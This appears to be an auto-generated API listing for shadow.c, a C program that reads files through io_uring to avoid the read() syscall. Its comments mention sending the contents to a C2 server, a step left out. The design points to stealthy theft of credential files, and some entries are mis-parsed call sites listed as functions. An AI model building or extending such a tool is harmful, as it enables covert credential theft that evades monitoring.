# API

## shadow.c

### read_file_sigilent (function) `int read_file_sigilent(const char *path, char *buffer, size_t bufsize)`
- Defined: `shadow.c:11`
- Doc: define ENTRIES 4

### main (function) `int main()`
- Defined: `shadow.c:47`

### io_uring_prep_read (function) `io_uring_prep_read(sqe, fd, buffer, bufsize - 1, 0);`
- Defined: `shadow.c:28`

### io_uring_sqe_set_data (function) `io_uring_sqe_set_data(sqe, NULL);`
- Defined: `shadow.c:29`

### io_uring_cqe_seen (function) `io_uring_cqe_seen(&ring, cqe);`
- Defined: `shadow.c:41`

### close (function) `close(fd);`
- Defined: `shadow.c:43`

### io_uring_queue_exit (function) `io_uring_queue_exit(&ring);`
- Defined: `shadow.c:44`

### printf (function) `printf("[+] Leído %d bytes sin usar read()\n", n);`
- Defined: `shadow.c:53`
- Doc: Enviar el contenido a un C2 mediante io_uring (omito por brevedad)
